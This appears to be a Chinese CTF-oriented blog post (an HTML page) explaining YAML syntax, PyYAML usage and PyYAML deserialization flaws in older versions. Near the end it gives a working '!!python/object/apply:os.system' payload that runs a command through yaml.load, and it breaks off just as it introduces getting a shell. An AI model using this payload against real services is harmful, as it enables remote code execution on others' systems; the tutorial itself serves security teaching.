@@ -1,0 +1,569 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web安全--Pyaml反序列化 | K1r1t5u6uのHexo</title><meta name="author" content="K1r1t5u6u"><meta name="copyright" content="K1r1t5u6u"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.Pyaml反序列化攻击0x01: yaml的基本语法结构介绍： YAML 全称 YAML Ain’t Markup Language（一种递归缩写），是一种人类可读的数据序列化格式。 YAML 常用于配置文件、数据交换以及各种需要以结构化方式存储数据的场景。 YAML 的语法和其他高级语言类似，可以简单表达清单、散列表、标量等数据形态。 它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全--Pyaml反序列化">
+<meta property="og:url" content="https://web218.github.io/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="K1r1t5u6uのHexo">
+<meta property="og:description" content="一.Pyaml反序列化攻击0x01: yaml的基本语法结构介绍： YAML 全称 YAML Ain’t Markup Language（一种递归缩写），是一种人类可读的数据序列化格式。 YAML 常用于配置文件、数据交换以及各种需要以结构化方式存储数据的场景。 YAML 的语法和其他高级语言类似，可以简单表达清单、散列表、标量等数据形态。 它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://web218.github.io/images/wgqs.jpg">
+<meta property="article:published_time" content="2026-09-17T10:03:30.714Z">
+<meta property="article:modified_time" content="2026-09-17T10:03:30.714Z">
+<meta property="article:author" content="K1r1t5u6u">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="PyYAML">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://web218.github.io/images/wgqs.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Web安全--Pyaml反序列化",
+  "url": "https://web218.github.io/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+  "image": "https://web218.github.io/images/wgqs.jpg",
+  "datePublished": "2026-09-17T10:03:30.714Z",
+  "dateModified": "2026-09-17T10:03:30.714Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "K1r1t5u6u",
+      "url": "https://web218.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/1.png"><link rel="canonical" href="https://web218.github.io/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const start = 6
+              const end = 18
+              const isNight =
+                start < end
+                    ? hour < start || hour >= end
+                    : hour >= start || hour < end
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Web安全--Pyaml反序列化',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/images/1.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/wgqs.jpg" onerror="this.onerror=null;this.src='/images/1.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">K1r1t5u6uのHexo</span></a><a class="nav-page-title" href="/"><span class="site-name">Web安全--Pyaml反序列化</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Web安全--Pyaml反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-09-17T10:03:30.714Z" title="发表于 2026-09-17 18:03:30">2026-09-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-17T10:03:30.714Z" title="更新于 2026-09-17 18:03:30">2026-09-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="一-Pyaml反序列化攻击"><a href="#一-Pyaml反序列化攻击" class="headerlink" title="一.Pyaml反序列化攻击"></a>一.Pyaml反序列化攻击</h1><h4 id="0x01-yaml的基本语法结构"><a href="#0x01-yaml的基本语法结构" class="headerlink" title="0x01: yaml的基本语法结构"></a>0x01: yaml的基本语法结构</h4><p>介绍：</p>
+<p>YAML 全称 YAML Ain’t Markup Language（一种递归缩写），是一种人类可读的数据序列化格式。</p>
+<p>YAML 常用于配置文件、数据交换以及各种需要以结构化方式存储数据的场景。</p>
+<p>YAML 的语法和其他高级语言类似，可以简单表达清单、散列表、标量等数据形态。</p>
+<p>它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲。</p>
+<p>YAML 的配置文件后缀为 .yml，如：<strong>1.yml</strong> </p>
+<p>以下是 YAML 最核心的语法规则，需要牢记：</p>
+<ul>
+<li>大小写敏感</li>
+<li>使用缩进表示层级关系</li>
+<li>缩进不允许使用 Tab，只允许空格</li>
+<li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li>
+<li># 表示注释</li>
+<li>:号后面要加空格</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Person:</span></span><br><span class="line">   <span class="attr">name:</span> <span class="string">anna</span></span><br><span class="line">   <span class="attr">age:</span> <span class="number">15</span></span><br><span class="line"><span class="attr">Person2:</span></span><br><span class="line">   <span class="attr">name:</span> <span class="string">Peter</span></span><br><span class="line">   <span class="attr">age:</span> <span class="number">16</span></span><br><span class="line">  <span class="string">……………………</span></span><br></pre></td></tr></table></figure>
+
+<p>2.文档分隔符</p>
+<p>在yaml中使用—作为文档之间的分割符，标记着一篇文档的结束，另一篇文档的开始</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Person:</span><br><span class="line">   name: anna</span><br><span class="line">   age: 15</span><br><span class="line">Person2:</span><br><span class="line">   name: Peter</span><br><span class="line">   age: 16</span><br><span class="line"> ---</span><br><span class="line"> Person3:</span><br><span class="line">   name: X3r</span><br><span class="line">   age: 21</span><br><span class="line">Person4:</span><br><span class="line">   name: X1d</span><br><span class="line">   age: 17</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>3.基本数据类型</p>
+<p>映射（Mapping &#x2F; 字典）</p>
+<p>键值对的集合，是yaml中最常见的数据类型 </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name :</span> <span class="string">Zhangsan</span></span><br><span class="line"><span class="attr">sex :</span> <span class="string">man</span></span><br><span class="line"><span class="attr">hobbie :</span> <span class="string">Computer</span></span><br><span class="line"><span class="string">....</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以按下面两种防方式写</p>
+<p>嵌套映射：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">张三</span></span><br><span class="line">  <span class="attr">address:</span></span><br><span class="line">    <span class="attr">city:</span> <span class="string">北京</span></span><br><span class="line">    <span class="attr">zipcode:</span> <span class="string">&quot;100000&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>形成层级关系</p>
+<p>流式映射写法    </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> &#123;<span class="attr">child-key:</span> <span class="string">value</span>, <span class="attr">child-key2:</span> <span class="string">value2</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.列表的写法</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Al1ex</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">0</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Tester</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">sex</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">woman</span></span><br></pre></td></tr></table></figure>
+
+<p>结果为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;Al1ex&#x27;, 0, &#x27;Tester&#x27;, &#x27;sex&#x27;, &#x27;woman&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>这里只对YAML做个简单的介绍 </p>
+<h4 id="0x02-Pyaml的简单使用"><a href="#0x02-Pyaml的简单使用" class="headerlink" title="0x02: Pyaml的简单使用"></a>0x02: Pyaml的简单使用</h4><p>Pyaml提供对Yaml文档进行序列化和反序列化操作，即Python和Yaml数据的互相转换：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">- Al1ex</span></span><br><span class="line"><span class="string">- 0</span></span><br><span class="line"><span class="string">- Tester</span></span><br><span class="line"><span class="string">- sex</span></span><br><span class="line"><span class="string">- woman</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(data, Loader=yaml.SafeLoader))</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(py313) PS E:\Microsoft VS Code&gt; &amp; f:\venv\py313\Scripts\python.exe c:/Users/alast/Downloads/<span class="number">22.</span>py</span><br><span class="line">[<span class="string">&#x27;Al1ex&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;Tester&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;woman&#x27;</span>]</span><br><span class="line">(py313) PS E:\Microsoft VS Code&gt; </span><br></pre></td></tr></table></figure>
+
+<p>嵌套格式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">person:</span></span><br><span class="line"><span class="string">  name: 张三</span></span><br><span class="line"><span class="string">  address:</span></span><br><span class="line"><span class="string">    city: 北京</span></span><br><span class="line"><span class="string">    zipcode: &quot;100000&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(data, Loader=yaml.SafeLoader))</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(py313) PS E:\Microsoft VS Code&gt; &amp; f:\venv\py313\Scripts\python.exe c:/Users/alast/Downloads/<span class="number">22.</span>py</span><br><span class="line">&#123;<span class="string">&#x27;person&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;address&#x27;</span>: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;zipcode&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>&#125;&#125;&#125;</span><br><span class="line">(py313) PS E:\Microsoft VS Code&gt;</span><br></pre></td></tr></table></figure>
+
+<p>yaml.dump：</p>
+<p>将python对象转换成yaml文档：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, attribute1, attribute2</span>):  </span><br><span class="line">        <span class="variable language_">self</span>.attribute1 = attribute1  </span><br><span class="line">        <span class="variable language_">self</span>.attribute2 = attribute2  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;MyClass(attribute1=<span class="subst">&#123;self.attribute1&#125;</span>, attribute2=<span class="subst">&#123;self.attribute2&#125;</span>)&quot;</span>  </span><br><span class="line">  </span><br><span class="line">obj = MyClass(<span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">yaml_str = yaml.dump(obj)  </span><br><span class="line"><span class="built_in">print</span>(yaml_str)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!python/object:__main__.MyClass &#123;attribute1: value1, attribute2: value2&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将对象转换为Yaml文档</p>
+<h4 id="0x03-Pyaml-反序列化漏洞"><a href="#0x03-Pyaml-反序列化漏洞" class="headerlink" title="0x03:Pyaml 反序列化漏洞"></a>0x03:Pyaml 反序列化漏洞</h4><p>思考：既然能将yaml格式的数据转换为Python代码，那么我们能不能通过这一点来构造一个特殊yaml文件，来执行服务器的命令，达到RCE呢？当然是可以的，下面我们来分版本讲解每个危险函数：</p>
+<h4 id="01：Pyaml库版本-5-1"><a href="#01：Pyaml库版本-5-1" class="headerlink" title="01：Pyaml库版本&lt; &#x3D;5.1"></a>01：Pyaml库版本&lt; &#x3D;5.1</h4><ul>
+<li>当版本&lt;&#x3D;5.1时，我们会用到以下函数对yaml数据进行反序列化：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load(data)</span><br><span class="line">load(data, Loader=Loader)</span><br><span class="line">load_all(data)</span><br><span class="line">load_all(data, Loader=Loader)</span><br></pre></td></tr></table></figure>
+
+<p>1.load(data) 反序列化文档数据为Python代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">person:</span></span><br><span class="line"><span class="string">  name: 张三</span></span><br><span class="line"><span class="string">  address:</span></span><br><span class="line"><span class="string">    city: 北京</span></span><br><span class="line"><span class="string">    zipcode: &quot;100000&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(data))</span><br></pre></td></tr></table></figure>
+
+<p>在&lt;5.1时，load_*()默认不需要添加第二个参数指定加载器，默认使用Loader加载器，也就是后面的UnsafeLoader加载器</p>
+<p>另外load(data, Loader&#x3D;Loader) 也可以指定第二个参数，指定加载器：</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">person:</span></span><br><span class="line"><span class="string">  name: 张三</span></span><br><span class="line"><span class="string">  address:</span></span><br><span class="line"><span class="string">    city: 北京</span></span><br><span class="line"><span class="string">    zipcode: &quot;100000&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(data,Loader=Baseloader))</span><br></pre></td></tr></table></figure>
+
+<p>(Baseloader 用于基础的加载器，支持基础的yaml)</p>
+<p>2.load_all() 前文有提到yaml 支持— 的形式分割文档 而load_all的功能则是反序列化多个文档：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">person:</span></span><br><span class="line"><span class="string">  name: 张三</span></span><br><span class="line"><span class="string">  address:</span></span><br><span class="line"><span class="string">    city: 北京</span></span><br><span class="line"><span class="string">    zipcode: &quot;100000&quot;</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">person2:</span></span><br><span class="line"><span class="string">  name: 李四</span></span><br><span class="line"><span class="string">  age: 20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(yaml.load_all(data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\download\pyyaml_lab&gt; &amp; F:\venv\pyaml42b4\Scripts\python.exe f:/download/pyyaml_lab/blank.py</span><br><span class="line">[&#123;<span class="string">&#x27;person&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;address&#x27;</span>: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;zipcode&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>&#125;&#125;&#125;, &#123;<span class="string">&#x27;person2&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>&#125;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>load_all(data, Loader&#x3D;Loader) 则同理</p>
+<h4 id="02：-Python-Object-解释器"><a href="#02：-Python-Object-解释器" class="headerlink" title="02：!!Python\Object:解释器"></a>02：!!Python\Object:解释器</h4><p><code>!!python/object</code> 标签指示 YAML 解析器应该将对应的 YAML 片段解析为一个 Python 对象：</p>
+<h5 id="2-1python-object-apply"><a href="#2-1python-object-apply" class="headerlink" title="2.1python&#x2F;object&#x2F;apply"></a>2.1python&#x2F;object&#x2F;apply</h5><p>python&#x2F;object&#x2F;apply 表示在yaml标签中调用一个可调用对象或者构造函数 并将其结果表示为一个对象</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:os.system [\&#x27;calc\&#x27;]&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以直接通过apply 调用os对象的system方法来构造RCE命令 执行calc弹计算器</p>
+<p>利用这点来弹shell:</p>
